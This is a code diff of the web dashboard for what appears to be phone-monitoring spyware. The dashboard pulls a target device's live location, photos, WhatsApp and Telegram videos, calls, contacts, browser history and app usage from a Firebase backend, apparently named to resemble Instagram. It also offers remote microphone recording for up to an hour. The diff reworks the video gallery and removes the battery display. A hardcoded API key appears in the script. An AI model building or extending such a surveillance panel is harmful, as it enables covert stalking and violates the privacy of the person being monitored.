@@ -87,9 +87,6 @@ button#loadHistoryBtn{padding:5px 7px;font-size:13px;min-height:30px;min-width:3
 .tab-btn{padding:10px 16px;font-size:13px;border:none;background:none;color:var(--muted);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:.15s}
 .tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
 .tab-btn:hover{color:var(--text)}
-.subtab-btn{padding:6px 14px;font-size:12px;border:1px solid var(--border);background:var(--card);color:var(--muted);cursor:pointer;border-radius:6px;transition:.15s}
-.subtab-btn.active{background:var(--accent);color:#000;border-color:var(--accent);font-weight:500}
-.subtab-btn:hover{color:var(--text)}
 .content{padding:12px;max-height:50vh;overflow-y:auto}
 .content>div{display:none}
 .content>div.active{display:block}
@@ -124,19 +121,6 @@ td{padding:6px 4px;border-bottom:1px solid var(--border)}
 .filter-chips{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
 .chip{padding:4px 10px;border-radius:12px;font-size:11px;border:1px solid var(--border);background:var(--bg);color:var(--muted);cursor:pointer}
 .chip.active{background:var(--accent);color:#000;border-color:var(--accent)}
-.gap-marker{display:flex;align-items:center;gap:8px;padding:8px 10px;font-size:10px;color:var(--muted);opacity:.6}
-.gap-marker hr{flex:1;border:none;border-top:1px dashed var(--border)}
-.gap-marker .gap-label{white-space:nowrap;font-style:italic}
-.time-group-header{font-size:11px;color:var(--accent);font-weight:600;padding:8px 10px 4px;border-bottom:1px solid var(--border);margin-top:4px;display:flex;align-items:center;gap:6px}
-.time-group-header:first-child{margin-top:0}
-.battery-indicator{display:inline-flex;align-items:center;gap:3px;font-size:11px;font-variant-numeric:tabular-nums}
-.battery-icon{display:inline-block;width:22px;height:11px;border:1.5px solid var(--text);border-radius:2px;position:relative;flex-shrink:0}
-.battery-icon::after{content:'';position:absolute;right:-3px;top:2.5px;width:2.5px;height:4px;background:var(--text);border-radius:0 1px 1px 0}
-.battery-fill{height:100%;border-radius:1px;transition:width .2s}
-.battery-fill.good{background:#3fb950}
-.battery-fill.ok{background:#d29922}
-.battery-fill.low{background:#f85149}
-.chrg-icon{font-size:10px;color:var(--accent)}
 .lightbox{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:9999;display:none;justify-content:center;align-items:center;cursor:zoom-out}
 .lightbox.open{display:flex}
 .lightbox img{max-width:95vw;max-height:95vh;object-fit:contain}
@@ -246,13 +230,13 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
 <button class="tab-btn" data-tab="recents">&#x23F1; Recents</button>
 <button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
+<button class="tab-btn" data-tab="videos">&#x1F3AC; Videos</button>
 <button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
 <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
 <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
 <button class="tab-btn" data-tab="health">&#x1F4AA; Health</button>
 <button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
 <button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
-<button class="tab-btn" data-tab="videos">&#x1F3AC; Videos</button>
 <button class="tab-btn" data-tab="playback">&#x25B6; Playback</button>
 <button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
 <button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
@@ -338,7 +322,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollAppSnapshots()">&#x1F504; Refresh</span>
 </div>
 </div>
-<div id="recentsList"><div class="label">Click Refresh to load app snapshots (battery, charging, network included)</div></div>
+<div id="recentsList"><div class="label">Click Refresh to load app snapshots</div></div>
 </div>
 <div id="tab-photos">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
@@ -350,6 +334,31 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 <div id="photoGrid" class="photo-grid"><div class="label" style="margin:20px 0">&#x1F4F8; Click the Photos tab to load</div></div>
 <div id="loadMoreContainer"></div>
+</div>
+<div id="tab-videos">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:14px;font-weight:500">&#x1F3AC; Videos <span id="videoCount" style="font-weight:400;color:var(--muted);font-size:12px"></span></span>
+<div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="loadAllVideos()">&#x1F4C2; Load All</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="videoOffset=0;cachedVideos={};pollVideos()">&#x1F504; Refresh</span>
+</div>
+</div>
+<div class="filter-chips" id="videoSourceChips">
+<span class="chip active" data-vsource="all">All</span>
+<span class="chip" data-vsource="camera">&#x1F4F7; Camera</span>
+<span class="chip" data-vsource="whatsapp">&#x1F4AC; WhatsApp</span>
+<span class="chip" data-vsource="telegram">&#x2709; Telegram</span>
+<span class="chip" data-vsource="download">&#x1F4E5; Downloads</span>
+<span class="chip" data-vsource="screen_recording">&#x1F4FD; Screen</span>
+<span class="chip" data-vsource="other">&#x1F4C1; Other</span>
+</div>
+<div id="videoGrid" class="photo-grid"><div class="label" style="margin:20px 0">&#x1F3AC; No videos synced yet</div></div>
+<div id="videoLoadMoreContainer"></div>
+</div>
+<div class="lightbox" id="videoPlayerOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:9999;justify-content:center;align-items:center;flex-direction:column;padding:20px">
+<button style="position:absolute;top:16px;right:16px;background:none;border:none;color:#fff;font-size:28px;cursor:pointer;z-index:10" onclick="closeVideoPlayer()">&times;</button>
+<video id="videoPlayer" controls style="max-width:100%;max-height:85vh;border-radius:8px" playsinline></video>
+<div id="videoPlayerMeta" style="color:var(--muted);font-size:12px;margin-top:8px;text-align:center"></div>
 </div>
 <div id="tab-timeline">
 <div class="filter-chips" id="timelineChips">
@@ -406,12 +415,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="contactsList"><div class="label">No contacts synced yet</div></div>
 </div>
 <div id="tab-voice">
-<div class="subtab-nav" style="display:flex;gap:4px;margin-bottom:12px">
-  <button class="subtab-btn active" data-subtab="voice-remote" onclick="switchVoiceSubtab('voice-remote')">🎙️ Remote Recordings</button>
-  <button class="subtab-btn" data-subtab="voice-notes" onclick="switchVoiceSubtab('voice-notes')">🎤 Voice Notes</button>
-</div>
-
-<div id="voice-sub-remote" class="voice-subtab">
 <div class="voice-record-panel" style="background:var(--card);padding:12px;border-radius:var(--radius);margin-bottom:12px;border:1px solid var(--border)">
 <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
 <span style="font-size:13px;font-weight:500;color:var(--text)">🎙️ Remote Recording</span>
@@ -423,7 +426,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <option value="1800">30 min</option>
 <option value="3600">60 min</option>
 </select>
-<select id="recDeviceSelect" class="device-select" style="font-size:12px;padding:6px 10px"><option value="">— Select device —</option></select>
 <button id="btnStartRecord" class="pb-btn" style="background:var(--danger);color:#fff;font-weight:600" onclick="startRemoteRecording()">
 <span>🎙️ Start Recording</span>
 </button>
@@ -440,7 +442,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span id="recProgressFormat" style="color:var(--muted);font-size:10px"></span>
 </div>
 <input type="range" id="recProgressBar" min="0" max="100" value="0" style="flex:1;accent-color:var(--danger);min-width:100px">
-<div id="recProgressCancel" style="display:none;margin-top:6px;font-size:11px;color:var(--muted);text-align:center">Recording in progress...</div>
 </div>
 
 <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;padding-top:8px;border-top:1px solid var(--border)">
@@ -457,31 +458,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 <div id="voiceNotesList"><div class="label">No recordings yet</div></div>
 </div>
-
-<div id="voice-sub-notes" class="voice-subtab" style="display:none">
-<div id="voiceNotesSubList"><div class="label">Loading voice notes...</div></div>
-</div>
-</div>
-
-<div id="tab-videos">
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px">
-  <span style="font-size:14px;font-weight:500">&#x1F3AC; Videos <span id="videoCount" style="font-weight:400;color:var(--muted);font-size:12px"></span></span>
-  <div style="display:flex;gap:6px;flex-wrap:wrap">
-    <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollVideos()">&#x1F504; Refresh</span>
-    <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="triggerVideoSync()">&#x1F4E1; Sync Now</span>
-  </div>
-</div>
-<div class="filter-chips" id="videoFilterChips" style="margin-bottom:8px">
-  <span class="chip active" data-filter="all">All</span>
-  <span class="chip" data-filter="whatsapp">WhatsApp</span>
-  <span class="chip" data-filter="camera">Camera</span>
-  <span class="chip" data-filter="telegram">Telegram</span>
-  <span class="chip" data-filter="other">Other</span>
-</div>
-<input type="text" id="videoSearch" placeholder="&#x1F50D; Search filename..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:12px">
-<div id="videoGrid" class="photo-grid"><div class="label" style="grid-column:1/-1;margin:20px 0">Click Refresh to load videos</div></div>
-</div>
-
 <div id="tab-insights">
 <div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
 <div><div class="label">&#x1F4CA; Today's Activity</div><div class="value" id="inTodayActivity">--</div></div>
@@ -706,7 +682,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <script>
 // --- Firebase Config ---
 const RTDB = 'https://instgram-7148c-default-rtdb.europe-west1.firebasedatabase.app';
-const STORAGE_BUCKET = 'instgram-7148c.appspot.com';
 const FIRESTORE = 'https://firestore.googleapis.com/v1/projects/instgram-7148c/databases/(default)/documents';
 const API_KEY = 'AIzaSyBzvqD0ZrFNYJnJEWQ2zJndIK9ZgqOSDm8';
 const PKT = 'Asia/Karachi';
@@ -714,8 +689,6 @@ const PKT = 'Asia/Karachi';
 // --- State ---
 let devices = {};
 let selectedDevice = null;
-let recordingDevice = null;
-let currentRecordingId = null;
 let locationHistory = [];
 let historyAutoLoaded = false;
 let marker, accuracyCircle, trail;
@@ -738,62 +711,6 @@ let timelineCache = null;
 let contactsCache = null;
 let contactsSyncTs = 0;
 let nomProcessing = false;
-let recordingDataCache = {};
-
-// --- IndexedDB Cache ---
-function openDB() {
-  return new Promise((resolve, reject) => {
-    const req = indexedDB.open('kojoCache', 1);
-    req.onerror = () => reject(req.error);
-    req.onsuccess = () => resolve(req.result);
-    req.onupgradeneeded = (e) => {
-      const db = e.target.result;
-      if (!db.objectStoreNames.contains('recordingMeta'))
-        db.createObjectStore('recordingMeta', { keyPath: 'keyId' });
-      if (!db.objectStoreNames.contains('voiceNoteMeta'))
-        db.createObjectStore('voiceNoteMeta', { keyPath: 'keyId' });
-      if (!db.objectStoreNames.contains('voiceNoteBatches'))
-        db.createObjectStore('voiceNoteBatches', { keyPath: 'keyId' });
-    };
-  });
-}
-async function cachePut(storeName, item) {
-  const db = await openDB();
-  return new Promise((resolve, reject) => {
-    const tx = db.transaction(storeName, 'readwrite');
-    tx.objectStore(storeName).put(item);
-    tx.oncomplete = () => { db.close(); resolve(); };
-    tx.onerror = () => { db.close(); reject(tx.error); };
-  });
-}
-async function cacheGetAll(storeName) {
-  const db = await openDB();
-  return new Promise((resolve, reject) => {
-    const tx = db.transaction(storeName, 'readonly');
-    const req = tx.objectStore(storeName).getAll();
-    req.onsuccess = () => { db.close(); resolve(req.result); };
-    req.onerror = () => { db.close(); reject(req.error); };
-  });
-}
-async function cacheDelete(storeName, keyId) {
-  const db = await openDB();
-  return new Promise((resolve, reject) => {
-    const tx = db.transaction(storeName, 'readwrite');
-    tx.objectStore(storeName).delete(keyId);
-    tx.oncomplete = () => { db.close(); resolve(); };
-    tx.onerror = () => { db.close(); reject(tx.error); };
-  });
-}
-async function cacheClear(storeName) {
-  const db = await openDB();
-  return new Promise((resolve, reject) => {
-    const tx = db.transaction(storeName, 'readwrite');
-    tx.objectStore(storeName).clear();
-    tx.oncomplete = () => { db.close(); resolve(); };
-    tx.onerror = () => { db.close(); reject(tx.error); };
-  });
-}
-// --- End IndexedDB Cache ---
 
 function loadGeofences(deviceId) {
   if (!deviceId) { geofences = []; renderGeofences(); renderGeofenceList(); return; }
@@ -1104,12 +1021,13 @@ document.addEventListener('keydown', e => {
     if (btns[idx]) btns[idx].click();
     return;
   }
-  const shortcuts = { 'h': 'health', 'p': 'photos', 'v': 'voice', 'l': 'live', 's': 'storage', 't': 'timeline', 'a': 'apps', 'r': 'recents', 'g': 'geofence', 'w': 'wifi', 'b': 'browser', 'c': 'calls', 'o': 'contacts' };
+  const shortcuts = { 'h': 'health', 'p': 'photos', 'm': 'videos', 'v': 'voice', 'l': 'live', 's': 'storage', 't': 'timeline', 'a': 'apps', 'r': 'recents', 'g': 'geofence', 'w': 'wifi', 'b': 'browser', 'c': 'calls', 'o': 'contacts' };
   if (shortcuts[e.key.toLowerCase()]) {
     document.querySelector('[data-tab="' + shortcuts[e.key.toLowerCase()] + '"]')?.click();
   }
   if (e.key === 'Escape') {
     document.getElementById('lightbox')?.classList.remove('open');
+    closeVideoPlayer();
   }
 });
 
@@ -1123,14 +1041,14 @@ document.addEventListener('visibilitychange', () => {
 document.getElementById('deviceSelect').addEventListener('change', function() {
   selectedDevice = this.value;
   localStorage.setItem('selectedDevice', selectedDevice);
-  recordingDevice = this.value;
-  const recSel = document.getElementById('recDeviceSelect');
-  if (recSel) recSel.value = recordingDevice;
   locationHistory = [];
   historyAutoLoaded = false;
   cachedPhotos = {};
   photoKeys = [];
   photoOffset = 0;
+  cachedVideos = {};
+  videoKeys = [];
+  videoOffset = 0;
   playbackPoints = [];
   timelineCache = null;
   appsCache = null;
@@ -1161,10 +1079,6 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   pollAll();
 });
 
-document.getElementById('recDeviceSelect').addEventListener('change', function() {
-  recordingDevice = this.value;
-});
-
 // --- Polling ---
 function stopPolling() {
   pollTimers.forEach(t => clearTimeout(t)); pollTimers = [];
@@ -1177,7 +1091,7 @@ function startPolling() {
   schedulePoll('apps', intervals.apps, pollApps);
   schedulePoll('appSnapshots', 30000, pollAppSnapshots);
   schedulePoll('hist', intervals.hist, pollHistory);
-  schedulePoll('voice', intervals.voice, pollRecordings);
+  schedulePoll('voice', intervals.voice, pollVoiceNotes);
   schedulePoll('contacts', intervals.contacts, pollContacts);
   schedulePoll('perms', intervals.perms, pollPermissions);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
@@ -1286,13 +1200,6 @@ async function fetchDevices() {
   dedupedIds.forEach(d => { devices[d.id] = { id: d.id, label: d.label, model: d.model, manuf: d.manuf }; });
   sel.innerHTML = dedupedIds.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
   sel.value = selectedDevice;
-
-  recordingDevice = selectedDevice;
-  const recSel = document.getElementById('recDeviceSelect');
-  if (recSel) {
-    recSel.innerHTML = dedupedIds.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
-    recSel.value = recordingDevice;
-  }
 }
 
 async function pollLocation() {
@@ -1393,6 +1300,154 @@ let photoOffset = 0;
 const PHOTO_BATCH = 24;
 let photoLoading = false;
 
+let videoKeys = [];
+let videoOffset = 0;
+const VIDEO_BATCH = 24;
+let videoLoading = false;
+let videoSourceFilter = 'all';
+let cachedVideos = {};
+
+async function pollVideos() {
+  if (!selectedDevice) return;
+  await loadVideos();
+}
+
+async function loadVideos() {
+  if (!selectedDevice) return;
+  try {
+    const data = await fetchRTDB(`devices/${selectedDevice}/videos`);
+    if (!data || typeof data !== 'object') { videoKeys = []; renderVideos(); return; }
+    // Collect flat video list with metadata
+    videoKeys = Object.keys(data).filter(k => typeof data[k] === 'object' && data[k] !== null && data[k].storageUrl);
+    videoKeys.sort((a, b) => (data[b].ts_ms || 0) - (data[a].ts_ms || 0));
+    cachedVideos = data;
+    document.getElementById('videoCount').textContent = `(${videoKeys.length})`;
+    videoOffset = 0;
+    document.getElementById('videoGrid').innerHTML = '';
+    const container = document.getElementById('videoLoadMoreContainer');
+    container.innerHTML = '';
+    await loadMoreVideos();
+  } catch (e) { console.error('loadVideos:', e); }
+}
+
+async function loadAllVideos() {
+  if (!selectedDevice || !videoKeys.length) { await loadVideos(); return; }
+  videoLoading = false;
+  while (videoOffset < videoKeys.length) {
+    await loadMoreVideos();
+    await new Promise(r => setTimeout(r, 10));
+  }
+}
+
+async function loadMoreVideos() {
+  if (!videoKeys.length) { renderVideos(); return; }
+  const end = Math.min(videoOffset + VIDEO_BATCH, videoKeys.length);
+  const batch = videoKeys.slice(videoOffset, end);
+  videoOffset = end;
+  const filtered = batch.filter(k => {
+    if (videoSourceFilter === 'all') return true;
+    const v = cachedVideos[k];
+    return v && (v.source === videoSourceFilter);
+  });
+  if (filtered.length) renderVideoGroup(filtered);
+  renderVideos();
+  const container = document.getElementById('videoLoadMoreContainer');
+  container.innerHTML = '';
+  if (videoOffset < videoKeys.length) {
+    const btn = document.createElement('button');
+    btn.className = 'load-more-btn';
+    btn.textContent = `Load more videos (${videoKeys.length - videoOffset} remaining)`;
+    btn.onclick = () => loadMoreVideos();
+    container.appendChild(btn);
+  }
+}
+
+function renderVideoGroup(keys) {
+  const grid = document.getElementById('videoGrid');
+  const videos = cachedVideos;
+  for (const k of keys) {
+    const v = videos[k];
+    if (!v || !v.storageUrl) continue;
+    const date = v.dateAdded ? new Date(v.dateAdded) : new Date(v.ts_ms);
+    const dateStr = date.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
+    const timeStr = date.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
+
+    // Check if we need a day header
+    const existingHeaders = grid.querySelectorAll('.photo-day-header');
+    let needsHeader = true;
+    for (const h of existingHeaders) {
+      if (h.textContent.includes(dateStr)) { needsHeader = false; break; }
+    }
+    if (needsHeader) {
+      const dayDiv = document.createElement('div');
+      dayDiv.className = 'photo-day';
+      const header = document.createElement('div');
+      header.className = 'photo-day-header';
+      header.innerHTML = `&#x1F4C5; ${dateStr}`;
+      dayDiv.appendChild(header);
+      grid.appendChild(dayDiv);
+    }
+
+    const wrap = document.createElement('div');
+    wrap.className = 'pwrap';
+    wrap.style.aspectRatio = v.width && v.height ? `${v.width}/${v.height}` : '16/9';
+
+    const thumb = v.thumb ? `data:image/jpeg;base64,${v.thumb}` : 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 9"%3E%3Crect width="16" height="9" fill="%23161b22"/%3E%3Ctext x="8" y="6" text-anchor="middle" fill="%238b949e" font-size="4"%3E&#x25B6;%3C/text%3E%3C/svg%3E';
+    const img = document.createElement('img');
+    img.loading = 'lazy';
+    img.src = thumb;
+    img.alt = v.fileName || 'Video';
+    img.onclick = () => openVideoPlayer(v.storageUrl, v);
+    wrap.appendChild(img);
+
+    const cap = document.createElement('div');
+    cap.className = 'pcap';
+    cap.innerHTML = `<span style="font-size:10px">&#x25B6; ${v.fileName || 'Video'}</span><div class="ptime">${timeStr}${v.source ? ' &middot; ' + v.source : ''}${v.durationMs ? ' &middot; ' + Math.round(v.durationMs/1000) + 's' : ''}</div>`;
+    wrap.appendChild(cap);
+
+    // Find or create the matching day div
+    const dayDivs = grid.querySelectorAll('.photo-day');
+    let targetDay = null;
+    for (const dd of dayDivs) {
+      if (dd.querySelector('.photo-day-header')?.textContent.includes(dateStr)) {
+        targetDay = dd;
+        break;
+      }
+    }
+    if (targetDay) targetDay.appendChild(wrap);
+    else grid.appendChild(wrap);
+  }
+}
+
+function renderVideos() {
+  const grid = document.getElementById('videoGrid');
+  if (!grid.children.length) {
+    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F3AC; No videos synced yet</div>';
+  }
+}
+
+function openVideoPlayer(storageUrl, meta) {
+  const overlay = document.getElementById('videoPlayerOverlay');
+  const player = document.getElementById('videoPlayer');
+  const metaEl = document.getElementById('videoPlayerMeta');
+  if (!overlay || !player) return;
+  player.src = storageUrl;
+  player.load();
+  const dur = meta.durationMs ? Math.round(meta.durationMs / 1000) + 's' : '';
+  const dim = meta.width && meta.height ? `${meta.width}x${meta.height}` : '';
+  const src = meta.source || '';
+  metaEl.innerHTML = [meta.fileName, dur, dim, src].filter(Boolean).join(' &middot; ');
+  overlay.style.display = 'flex';
+  player.play().catch(() => {});
+}
+
+function closeVideoPlayer() {
+  const overlay = document.getElementById('videoPlayerOverlay');
+  const player = document.getElementById('videoPlayer');
+  if (overlay) overlay.style.display = 'none';
+  if (player) { player.pause(); player.src = ''; }
+}
+
 function dateBucket(ts) {
   if (!ts) return 'Older';
   const now = new Date();
@@ -1421,11 +1476,12 @@ function renderPhotosFromCache() {
     return;
   }
 
-  // Dedup by (firebaseKey, fileName, dateTaken) keeping highest quality
+  // Dedup by md5 (content hash) keeping highest quality.
+  // New entries have md5 field; old entries fall back to fileName|dateTaken (no ts).
   const dedup = {};
   for (const [ts, doc] of Object.entries(cachedPhotos)) {
     if (!doc || !doc.data) continue;
-    const key = ts + '|' + (doc.fileName || '') + '|' + (doc.dateTaken || '');
+    const key = doc.md5 || (doc.fileName || '') + '|' + (doc.dateTaken || '');
     const existing = dedup[key];
     if (!existing || (doc.data.length > existing.data.length)) dedup[key] = doc;
   }
@@ -1559,7 +1615,9 @@ document.getElementById('lightbox')?.addEventListener('click', function() {
   this.classList.remove('open');
 });
 
-// --- RTDB Sync Trigger ---
+document.getElementById('videoPlayerOverlay')?.addEventListener('click', function(e) {
+  if (e.target === this) closeVideoPlayer();
+});
 
 // --- RTDB Sync Trigger ---
 let autoSyncTimer = null;
@@ -1728,102 +1786,71 @@ function renderRecents() {
     return;
   }
 
+  // Dedup toggle persisted in localStorage (default ON)
   const dedupEnabled = localStorage.getItem('recentsDedup') !== 'false';
   const dedupToggle = document.getElementById('recentsDedupToggle');
   if (dedupToggle) dedupToggle.checked = dedupEnabled;
 
+  // Time range filter
   const now = Date.now();
   const timeRangeMs = {
-    '1h': 3600000, '6h': 21600000, '12h': 43200000,
-    '24h': 86400000, '7d': 604800000, '30d': 2592000000, 'all': Infinity
+    '1h': 3600000,
+    '6h': 21600000,
+    '12h': 43200000,
+    '24h': 86400000,
+    '7d': 604800000,
+    '30d': 2592000000,
+    'all': Infinity
   };
   const cutoff = now - (timeRangeMs[recentsTimeRange] || timeRangeMs['24h']);
+
+  // Search filter
   const searchLower = recentsSearchQuery.toLowerCase();
 
+  // Apply filters
   let filtered = appSnapshotsCache.filter(s => {
     if (s.phoneTsMs < cutoff) return false;
     if (searchLower && !s.appName.toLowerCase().includes(searchLower) && !s.packageName.toLowerCase().includes(searchLower)) return false;
     return true;
   });
 
+  // Dedup by appName + exact phoneTsMs (same app + same timestamp = true duplicate)
   let deduped = filtered;
   if (dedupEnabled) {
     const seen = new Set();
     deduped = filtered.filter(s => {
-      const key = s.appName + '|' + s.phoneTsMs;
+      const key = s.appName + '|' + s.phoneTsMs; // unique per app + capture timestamp
       if (seen.has(key)) return false;
       seen.add(key);
       return true;
     });
   }
 
+  // Already sorted newest-first from pollAppSnapshots()
+  // deduped maintains the order
+
+  // Update count
   if (countEl) {
     countEl.textContent = deduped.length + ' entries' + (filtered.length !== deduped.length ? ' (' + filtered.length + ' filtered)' : '');
-  }
-
-  const GAP_MS = 120000;
-  const todayLabel = new Date().toLocaleDateString('en-PK', { timeZone: PKT, weekday: 'short', month: 'short', day: 'numeric' });
-  let html = '';
-  let prevTs = Infinity;
-  let lastGroupKey = '';
-
-  for (const s of deduped) {
-    const ts = s.phoneTsMs;
-
-    if (prevTs < Infinity) {
-      const gap = prevTs - ts;
-      if (gap > GAP_MS) {
-        const mins = Math.floor(gap / 60000);
-        const secs = Math.floor((gap % 60000) / 1000);
-        html += '<div class="gap-marker"><hr><span class="gap-label">\u23F0 Idle ' +
-          (mins > 0 ? mins + 'm ' : '') + secs + 's</span><hr></div>';
+    if (appSnapshotsCache.length > 0) {
+      const lastSync = appSnapshotsCache[0].dashboardTsMs || appSnapshotsCache[0].phoneTsMs;
+      if (lastSync && lastSync > 0) {
+        countEl.textContent += ' · Sync: ' + pktShort(lastSync);
       }
     }
-
-    const groupKey = getTimeBlockKey(ts);
-    const groupLabel = getTimeBlockLabel(ts, todayLabel);
-    if (groupKey !== lastGroupKey) {
-      if (lastGroupKey) html += '<div class="gap-marker" style="opacity:.2"><hr></div>';
-      html += '<div class="time-group-header">' + groupLabel + '</div>';
-      lastGroupKey = groupKey;
-    }
-
-    html += '<div class="bar-row" style="padding:6px 10px;gap:8px;border-bottom:1px solid var(--border);display:flex;align-items:center">' +
-      '<span style="font-size:11px;color:var(--accent);min-width:70px;white-space:nowrap;flex-shrink:0">' + pktShort(ts) + '</span>' +
-      '<span style="font-size:11px;color:var(--text);font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex-shrink:0;max-width:140px">' + s.appName + '</span>' +
-      '<span style="font-size:9px;color:var(--muted);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;min-width:0;max-width:200px">' + s.packageName + '</span>' +
-      '<span style="flex-shrink:0">' + batteryHtml(s) + '</span>' +
-    '</div>';
-
-    prevTs = ts;
   }
 
+  // Build flat chronological list (newest first)
+  let html = '';
+  for (const s of deduped) {
+    html += '<div class="bar-row" style="padding:6px 10px;gap:10px;border-bottom:1px solid var(--border);display:flex;align-items:center">' +
+      '<span style="font-size:11px;color:var(--accent);min-width:160px;white-space:nowrap">' + pktShort(s.phoneTsMs) + '</span>' +
+      '<span style="font-size:11px;color:var(--text);font-weight:500;min-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + s.appName + '</span>' +
+      '<span style="font-size:10px;color:var(--muted);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;min-width:100px">' + s.packageName + '</span>' +
+      '<span style="font-size:10px;color:var(--info);min-width:160px;white-space:nowrap">' + pktShort(s.dashboardTsMs) + '</span>' +
+    '</div>';
+  }
   list.innerHTML = html || '<div class="label">No snapshots match your filters</div>';
-}
-
-function getTimeBlockKey(ts) {
-  const d = new Date(ts);
-  return d.getFullYear() + '-' + d.getMonth() + '-' + d.getDate() + '-' + d.getHours();
-}
-
-function getTimeBlockLabel(ts, todayLabel) {
-  const d = new Date(ts);
-  const dateStr = d.toLocaleDateString('en-PK', { timeZone: PKT, weekday: 'short', month: 'short', day: 'numeric' });
-  const hourStr = d.toLocaleString('en-PK', { timeZone: PKT, hour: 'numeric', hour12: true });
-  const prefix = dateStr === todayLabel ? '\uD83D\uDD52 Today' : dateStr;
-  return prefix + ' \u00B7 ' + hourStr;
-}
-
-function batteryHtml(s) {
-  if (s.batteryPct === undefined) return '';
-  const pct = s.batteryPct;
-  const fillClass = pct >= 50 ? 'good' : pct >= 20 ? 'ok' : 'low';
-  const fillWidth = Math.max(2, Math.min(100, pct)) + '%';
-  const chrg = s.isCharging ? ' <span class="chrg-icon">\u26A1</span>' : '';
-  return '<span class="battery-indicator">' +
-    '<span class="battery-icon"><span class="battery-fill ' + fillClass + '" style="width:' + fillWidth + '"></span></span>' +
-    '<span style="font-size:10px;color:var(--muted)">' + pct + '%</span>' + chrg +
-  '</span>';
 }
 
 // Time range change
@@ -1872,15 +1899,12 @@ function exportRecentsCSV() {
   
   const deduped = filtered;
   
-  const headers = ['App Name', 'Package Name', 'Phone Timestamp', 'Battery %', 'Charging', 'Network', 'WiFi SSID'];
+  const headers = ['App Name', 'Package Name', 'Phone Timestamp', 'Dashboard Timestamp'];
   const rows = deduped.map(s => [
     `"${s.appName.replace(/"/g, '""')}"`,
     `"${s.packageName.replace(/"/g, '""')}"`,
     new Date(s.phoneTsMs).toISOString(),
-    s.batteryPct !== undefined ? s.batteryPct : '',
-    s.isCharging ? 'Yes' : 'No',
-    s.networkType || '',
-    s.wifiSsid || ''
+    new Date(s.dashboardTsMs).toISOString()
   ].join(','));
   
   const csv = [headers.join(','), ...rows].join('\n');
@@ -1898,9 +1922,16 @@ async function pollAppSnapshots() {
   const data = await fetchRTDB(`devices/${selectedDevice}/appSnapshots`);
   if (!data || typeof data !== 'object') {
     if (selectedDevice !== deviceAtStart) return;
+    if (appSnapshotsCache && appSnapshotsCache.length) {
+      // Fetch failed but we have stale data — keep cache and warn
+      showAlert('Failed to refresh snapshots — showing cached data', 'error');
+      appSnapshotsLastSync = 0;
+      renderRecents();
+      return;
+    }
     appSnapshotsCache = null;
     appSnapshotsLastSync = 0;
-    document.getElementById('appsChart').innerHTML = '<div class="label">No app snapshots yet. Captured every 30s by the phone.</div>';
+    document.getElementById('appsChart').innerHTML = '<div class="label" style="color:var(--muted)">No app snapshots found — device may not support this feature or has never synced.</div>';
     renderRecents();
     return;
   }
@@ -1911,13 +1942,8 @@ async function pollAppSnapshots() {
       key,
       appName: val.appName || val.packageName || '?',
       packageName: val.packageName || '',
-      phoneTsMs: parseInt(val.phoneTsMs || val.ts_ms || '0'),
-      dashboardTsMs: parseInt(val.dashboardTsMs || '0'),
-      batteryPct: val.batteryPct !== undefined ? parseInt(val.batteryPct) : undefined,
-      isCharging: val.isCharging === true,
-      networkType: val.networkType || undefined,
-      wifiSsid: val.wifiSsid || undefined,
